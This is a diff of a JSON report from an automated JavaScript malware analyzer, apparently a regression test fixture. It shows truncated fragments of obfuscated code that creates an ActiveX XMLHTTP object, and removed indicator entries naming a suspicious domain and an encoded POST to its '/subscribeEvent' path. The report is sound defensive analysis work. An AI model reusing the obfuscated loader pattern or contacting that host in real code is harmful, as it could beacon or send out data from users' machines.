@@ -1,7 +1,7 @@
 {
   "extra": {
     "drop_file": false,
-    "score": 1563,
+    "score": 1051,
     "sections": [
       {
         "auto_collapse": false,
@@ -38,7 +38,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "The prefix '_0x' in names of variables and functions suggests that obfuscated code exists\n\t\t(function(_0x23a9fd,_0xc65648){var a0_0x378c28={_0x34617f:'OxEG',_0x349369:0x4f4,_0x1d045c:'Ks$Q',_0...\n\t\tfunction _0x2ef12d(_0x24118d,_0x1e2418){return a0_0x1fce(_0x1e2418-a0_0x180d09._0x8d60f6,_0x24118d)\n\t\t}while(!![]){try{var _0x1e8900=parseInt(_0x2ef12d(a0_0x378c28._0x34617f,a0_0x378c28._0x349369))/0x1+...\n\t\tif(_0x1e8900===_0xc65648)break\n\t\telse _0x285de5['push'](_0x285de5['shift']())\n\t\t}catch(_0x32da00){_0x285de5['push'](_0x285de5['shift']())\n\t\t}}}(a0_0xb9fe,0xbbd3f))\n\t\tvar a0_0x56e24b=new ActiveXObject(a0_0x32782b('Vm^C',0x443)+a0_0x32782b('dPAd',0x43c))\n\t\ta0_0x56e24b[a0_0x32782b('OxEG',0x436)](a0_0x32782b('a2Gn',0x43b),a0_0x32782b('Le$w',0x44a)+a0_0x3278...\n\t\tfunction a0_0xb9fe(){var _0x2e2ece=['WOFdLCojpHm','f8kLhCodpSosW5z6W63cOtmVDG','WQhcV8o4gSoXxxJdMSoe...\n\t\ta0_0xb9fe=function(){return _0x2e2ece\n\t\treturn a0_0xb9fe()\n\t\t}function a0_0x32782b(_0x27a6ae,_0x22dcc7){var a0_0x40ee2f={_0x5ad512:0x24d}\n\t\treturn a0_0x1fce(_0x22dcc7-a0_0x40ee2f._0x5ad512,_0x27a6ae)\n\t\t}function a0_0x1fce(_0x1ae9dc,_0x562a13){var _0xb9fe0a=a0_0xb9fe()\n\t\treturn a0_0x1fce=function(_0x1fcea7,_0x42e831){_0x1fcea7=_0x1fcea7-0x1d7\n\t\tvar _0x2e23d7=_0xb9fe0a[_0x1fcea7]\n\t\tif(a0_0x1fce['EFIMcf']===undefined){var _0x1417f7=function(_0x46edb5){var _0x54135f='abcdefghijklmno...\n\t\tvar _0x7f56af='',_0x46a0e3=''\n\t\tfor(var _0x22c8c8=0x0,_0x4867ca,_0x55cb00,_0x1138fb=0x0\n\t\t_0x55cb00=_0x46edb5['charAt'](_0x1138fb++)\n\t\t~_0x55cb00&&(_0x4867ca=_0x22c8c8%0x4?_0x4867ca*0x40+_0x55cb00:_0x55cb00,_0x22c8c8++%0x4)?_0x7f56af+=...\n\t\t}for(var _0x578679=0x0,_0x186616=_0x7f56af['length']\n\t\t_0x578679<_0x186616\n\t\t_0x578679++){_0x46a0e3+='%'+('00'+_0x7f56af['charCodeAt'](_0x578679)['toString'](0x10))['slice'](-0x...\n\t\t}return decodeURIComponent(_0x46a0e3)\n\t\tvar _0x56e24b=function(_0x4d03a9,_0x2b85a8){var _0x3c0e47=[],_0x5850be=0x0,_0x162684,_0x28354f=''\n\t\t_0x4d03a9=_0x1417f7(_0x4d03a9)\n\t\tvar _0x19aac8\n\t\tfor(_0x19aac8=0x0\n\t\t_0x19aac8<0x100\n\t\t_0x19aac8++){_0x3c0e47[_0x19aac8]=_0x19aac8\n\t\t}for(_0x19aac8=0x0\n\t\t_0x19aac8++){_0x5850be=(_0x5850be+_0x3c0e47[_0x19aac8]+_0x2b85a8['charCodeAt'](_0x19aac8%_0x2b85a8['...\n\t\t}_0x19aac8=0x0,_0x5850be=0x0\n\t\tfor(var _0x1bc0ad=0x0\n\t\t_0x1bc0ad<_0x4d03a9['length']\n\t\t_0x1bc0ad++){_0x19aac8=(_0x19aac8+0x1)%0x100,_0x5850be=(_0x5850be+_0x3c0e47[_0x19aac8])%0x100,_0x162...\n\t\t}return _0x28354f\n\t\ta0_0x1fce['TYvbrR']=_0x56e24b,_0x1ae9dc=arguments,a0_0x1fce['EFIMcf']=!![]\n\t\t}var _0x2a558b=_0xb9fe0a[0x0],_0x2bdd35=_0x1fcea7+_0x2a558b,_0x5209ea=_0x1ae9dc[_0x2bdd35]\n\t\treturn!_0x5209ea?(a0_0x1fce['hgVsIE']===undefined&&(a0_0x1fce['hgVsIE']=!![]),_0x2e23d7=a0_0x1fce['T...\n\t\t},a0_0x1fce(_0x1ae9dc,_0x562a13)\n\t\t}a0_0x56e24b[a0_0x32782b('KmB(',0x42e)](a0_0x32782b('!T$t',0x426)+a0_0x32782b('sgaF',0x424)+a0_0x327...",
+        "body": "The prefix '_0x' in names of variables and functions suggests that obfuscated code exists\n\t\t(function(_0x23a9fd,_0xc65648){var a0_0x378c28={_0x34617f:'OxEG',_0x349369:0x4f4,_0x1d045c:'Ks$Q',_0...\n\t\tfunction _0x2ef12d(_0x24118d,_0x1e2418){return a0_0x1fce(_0x1e2418-a0_0x180d09._0x8d60f6,_0x24118d)\n\t\t}while(!![]){try{var _0x1e8900=parseInt(_0x2ef12d(a0_0x378c28._0x34617f,a0_0x378c28._0x349369))/0x1+...\n\t\tif(_0x1e8900===_0xc65648)break\n\t\telse _0x285de5['push'](_0x285de5['shift']())\n\t\t}catch(_0x32da00){_0x285de5['push'](_0x285de5['shift']())\n\t\t}}}(a0_0xb9fe,0xbbd3f))\n\t\tvar a0_0x56e24b=new ActiveXObject(a0_0x32782b('Vm^C',0x443)+a0_0x32782b('dPAd',0x43c))\n\t\ta0_0x56e24b[a0_0x32782b('OxEG',0x436)](a0_0x32782b('a2Gn',0x43b),a0_0x32782b('Le$w',0x44a)+a0_0x3278...\n\t\tfunction a0_0xb9fe(){var _0x2e2ece=['WOFdLCojpHm','f8kLhCodpSosW5z6W63cOtmVDG','WQhcV8o4gSoXxxJdMSoe...\n\t\t[34 Mark(s) Truncated]",
         "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
@@ -62,7 +62,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript creates an ActiveXObject\n\t\tActiveXObject(MSXML2.XMLHTTP)\n\t\tvar a0_0x56e24b=new ActiveXObject(a0_0x32782b('Vm^C',0x443)+a0_0x32782b('dPAd',0x43c))",
+        "body": "JavaScript creates an ActiveXObject\n\t\tvar a0_0x56e24b=new ActiveXObject(a0_0x32782b('Vm^C',0x443)+a0_0x32782b('dPAd',0x43c))",
         "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
@@ -134,30 +134,6 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript prepares a network request\n\t\tMSXML2.XMLHTTP[12].setRequestHeader(\"Upgrade-Insecure-Requests\", \"1\")",
-        "body_config": {},
-        "body_format": "TEXT",
-        "classification": "TLP:C",
-        "depth": 1,
-        "heuristic": {
-          "attack_ids": [],
-          "frequency": 1,
-          "heur_id": 3,
-          "score": 10,
-          "score_map": {
-            "prepare_network_request": 10
-          },
-          "signatures": {
-            "prepare_network_request": 1
-          }
-        },
-        "promote_to": null,
-        "tags": {},
-        "title_text": "Signature: PrepareNetworkRequest",
-        "zeroize_on_tag_safe": false
-      },
-      {
-        "auto_collapse": false,
         "body": "JavaScript uses unescape() to decode an encoded string\n\t\treturn e},random:Un,now:Wn,escape:$n,unescape:Cn,templateSettings:Kn,template:function(n,r,t){!r&&t&...",
         "body_config": {},
         "body_format": "TEXT",
@@ -178,130 +154,6 @@
         "promote_to": null,
         "tags": {},
         "title_text": "Signature: Unescape",
-        "zeroize_on_tag_safe": false
-      },
-      {
-        "auto_collapse": false,
-        "body": [
-          {
-            "ioc": "dce42.shrubs.emptyisland.pics",
-            "ioc_type": "domain"
-          },
-          {
-            "ioc": "https://dce42.shrubs.emptyisland.pics/subscribeEvent",
-            "ioc_type": "uri"
-          },
-          {
-            "ioc": "/subscribeEvent",
-            "ioc_type": "uri_path"
-          }
-        ],
-        "body_config": {
-          "column_order": [
-            "ioc_type",
-            "ioc"
-          ]
-        },
-        "body_format": "TABLE",
-        "classification": "TLP:C",
-        "depth": 0,
-        "heuristic": {
-          "attack_ids": [],
-          "frequency": 1,
-          "heur_id": 2,
-          "score": 1,
-          "score_map": {},
-          "signatures": {}
-        },
-        "promote_to": null,
-        "tags": {
-          "network": {
-            "static": {
-              "domain": [
-                "dce42.shrubs.emptyisland.pics"
-              ],
-              "uri": [
-                "https://dce42.shrubs.emptyisland.pics/subscribeEvent"
-              ],
-              "uri_path": [
-                "/subscribeEvent"
-              ]
-            }
-          }
-        },
-        "title_text": "MalwareJail extracted the following IOCs",
-        "zeroize_on_tag_safe": false
-      },
-      {
-        "auto_collapse": false,
-        "body": [
-          {
-            "method": "POST",
-            "request_body": "GTF8Cht4qIj0zVkehbMzFtYQtgf1ySNAltTgXW4UaQ==",
-            "request_headers": "1",
-            "url": "https://dce42.shrubs.emptyisland.pics/subscribeEvent"
-          }
-        ],
-        "body_config": {
-          "column_order": [
-            "url",
-            "method",
-            "request_headers",
-            "request_body"
-          ]
-        },
-        "body_format": "TABLE",
-        "classification": "TLP:C",
-        "depth": 0,
-        "heuristic": {
-          "attack_ids": [],
-          "frequency": 1,
-          "heur_id": 1,
-          "score": 500,
-          "score_map": {
-            "obfuscator_io_usage_url": 500
-          },
-          "signatures": {
-            "obfuscator_io_usage_url": 1
-          }
-        },
-        "promote_to": null,
-        "tags": {
-          "network": {
-            "dynamic": {
-              "domain": [
-                "dce42.shrubs.emptyisland.pics"
-              ],
-              "uri": [
-                "https://dce42.shrubs.emptyisland.pics/subscribeEvent"
-              ],
-              "uri_path": [
-                "/subscribeEvent"
-              ]
-            }
-          }
-        },
-        "title_text": "URLs",
-        "zeroize_on_tag_safe": false
-      },
-      {
-        "auto_collapse": false,
-        "body": "\t\tAn unsafe statement was found: Function",
-        "body_config": {},
-        "body_format": "TEXT",
-        "classification": "TLP:C",
-        "depth": 0,
-        "heuristic": {
-          "attack_ids": [],
-          "frequency": 1,
-          "heur_id": 2,
-          "score": 1,
-          "score_map": {},
-          "signatures": {}
-        },
-        "promote_to": null,
-        "tags": {},
-        "title_text": "JS-X-Ray IOCs Detected",
         "zeroize_on_tag_safe": false
       },
       {
@@ -329,10 +181,6 @@
   "files": {
     "extracted": [
       {
-        "name": "https://dce42.shrubs.emptyisland.pics/subscribeEvent",
-        "sha256": "047afbd5396bf549caf620ad9de260d53e84cdb61827db784213078a478c7f12"
-      },
-      {
         "name": "59eaf90e91b13fcb16f228d304ff863edab9665579c80b9a870447d476195d6c.cleaned",
         "sha256": "bc20f8b0b42a8f1ac71a131ad759480eb63181a72365dc24c7c4e529829cdc11"
       }
@@ -341,23 +189,6 @@
   },
   "results": {
     "heuristics": [
-      {
-        "attack_ids": [],
-        "heur_id": 1,
-        "signatures": [
-          "obfuscator_io_usage_url"
-        ]
-      },
-      {
-        "attack_ids": [],
-        "heur_id": 2,
-        "signatures": []
-      },
-      {
-        "attack_ids": [],
-        "heur_id": 2,
-        "signatures": []
-      },
       {
         "attack_ids": [],
         "heur_id": 3,
@@ -390,13 +221,6 @@
         "attack_ids": [],
         "heur_id": 3,
         "signatures": [
-          "prepare_network_request"
-        ]
-      },
-      {
-        "attack_ids": [],
-        "heur_id": 3,
-        "signatures": [
           "unescape"
         ]
       },
@@ -411,63 +235,9 @@
         "signatures": []
       }
     ],
-    "tags": {
-      "network.dynamic.domain": [
-        {
-          "heur_id": 1,
-          "signatures": [
-            "obfuscator_io_usage_url"
-          ],
-          "value": "dce42.shrubs.emptyisland.pics"
-        }
-      ],
-      "network.dynamic.uri": [
-        {
-          "heur_id": 1,
-          "signatures": [
-            "obfuscator_io_usage_url"
-          ],
-          "value": "https://dce42.shrubs.emptyisland.pics/subscribeEvent"
-        }
-      ],
-      "network.dynamic.uri_path": [
-        {
-          "heur_id": 1,
-          "signatures": [
-            "obfuscator_io_usage_url"
-          ],
-          "value": "/subscribeEvent"
-        }
-      ],
-      "network.static.domain": [
-        {
-          "heur_id": 2,
-          "signatures": [],
-          "value": "dce42.shrubs.emptyisland.pics"
-        }
-      ],
-      "network.static.uri": [
-        {
-          "heur_id": 2,
-          "signatures": [],
-          "value": "https://dce42.shrubs.emptyisland.pics/subscribeEvent"
-        }
-      ],
-      "network.static.uri_path": [
-        {
-          "heur_id": 2,
-          "signatures": [],
-          "value": "/subscribeEvent"
-        }
-      ]
-    },
+    "tags": {},
     "temp_submission_data": {
-      "cleaned_by_synchrony": true,
-      "uri_metadata_4bb72720a72237ee95537a43adbcbc32": {
-        "data": "GTF8Cht4qIj0zVkehbMzFtYQtgf1ySNAltTgXW4UaQ==",
-        "headers": {},
-        "method": "POST"
-      }
+      "cleaned_by_synchrony": true
     }
   }
 }
